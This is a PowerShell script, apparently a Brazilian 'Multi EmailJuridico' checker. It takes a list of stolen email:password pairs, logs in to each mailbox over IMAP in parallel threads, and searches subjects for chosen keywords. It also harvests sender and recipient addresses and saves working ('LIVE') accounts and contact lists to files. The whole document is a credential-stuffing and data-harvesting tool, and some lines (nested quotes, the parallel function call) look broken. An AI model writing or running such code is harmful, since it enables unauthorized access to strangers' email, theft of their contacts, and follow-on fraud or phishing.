[Console]::Title = "Multi EmailJuridico v1 - PowerShell"
Add-Type -AssemblyName System.Web

$lista   = Get-Content -LiteralPath "lista.txt"
$palavras= (Read-Host "Palavras-chave (separadas por |)").Split("|").Trim()
$threads = [int](Read-Host "Quantas threads (ex: 50)")
$pause   = 50

$imapMap = @{
    'gcnetprovedor'= 'imap.gcnetprovedor.com.br'
    'viagee'       = 'imap.viagee.com.br'
    'keynet'       = 'imap.keynet.com.br'
    'searnanet'    = 'imap.searnanet.com.br'
    'locaweb'      = 'imap.locaweb.com.br'
    'webmail'      = 'imap.webmail.coop.br'
}

"resultados","contatos" | ForEach-Object { New-Item -ItemType Directory -Force $_ | Out-Null }

function Test-Email {
    param($line)

    $parts = $line -split ':',2
    if($parts.Count -ne 2){ Write-Host "[!] $line – formato ruim" -ForegroundColor Magenta; return }
    $email,$pass = $parts[0].Trim(),$parts[1].Trim()
    $dom = ($email -split '@')[1].Split('.')[0]
    $imapSrv = if($imapMap.ContainsKey($dom)){ $imapMap[$dom] }else{ "imap.$dom.com.br" }

    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect($imapSrv,993)
        $ssl  = New-Object System.Net.Security.SslStream($tcp.GetStream(),$false)
        $ssl.AuthenticateAsClient($imapSrv)
        $sw = New-Object System.IO.StreamWriter($ssl)
        $sr = New-Object System.IO.StreamReader($ssl)

        function Send($cmd){ $sw.WriteLine($cmd); $sw.Flush(); return $sr.ReadLine() }
        Send ". CAPABILITY" | Out-Null
        $loginResp = Send ". LOGIN "$email" "$pass""
        if($loginResp -like '*. NO*' -or $loginResp -like '*. BAD*'){
            Write-Host "[FAIL] $email : $pass – credencial" -ForegroundColor Red
            return
        }
        Send ". SELECT INBOX" | Out-Null
        $resp = Send ". SEARCH ALL"
        $ids  = [regex]::Matches($resp,'\d+').Value

        $hits = @()
        foreach($w in $palavras){
            $resp = Send ". SEARCH SUBJECT "$w""
            if($resp -match '\d+'){ $hits += $w }
        }

        $contacts = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
        foreach($id in $ids | Select-Object -First 100){
            $mime = Send ". FETCH $id (BODY[HEADER.FIELDS (FROM TO CC)])"
            [regex]::Matches($mime,'[\w\.-]+@[\w\.-]+\.\w{2,}').Value.ForEach({ $contacts.Add($_) | Out-Null })
        }

        $contacts | Sort-Object | Out-File "contatos/contatos_$($email.Replace('@','_').Replace('.','_')).txt" -Encoding utf8
        if($hits){
            Write-Host "[LIVE] $email : $pass – palavras: $($hits -join ',')" -ForegroundColor Green
            Add-Content "resultados/lives-palavrachave.txt" "[LIVE] $email : $pass – palavras: $($hits -join ',')"
        }else{
            Write-Host "[LIVE] $email : $pass – sem palavras" -ForegroundColor Yellow
            Add-Content "resultados/live-sempalavra.txt" "[LIVE] $email : $pass – sem palavras"
        }
        Send ". LOGOUT" | Out-Null
    }
    catch {
        Write-Host "[FAIL] $email : $pass – $($_.Exception.Message)" -ForegroundColor DarkGray
    }
    finally { if($tcp){ $tcp.Close() } }
}

Write-Host "
Iniciando testes com $threads threads...
" -ForegroundColor Cyan
$lista | ForEach-Object -Parallel {
    Test-Email $_
    Start-Sleep -Milliseconds $using:pause
} -ThrottleLimit $threads

Write-Host "
Pronto! Verifique as pastas contatos/ e resultados/" -ForegroundColor Green
Read-Host "
Pressione ENTER para sair"
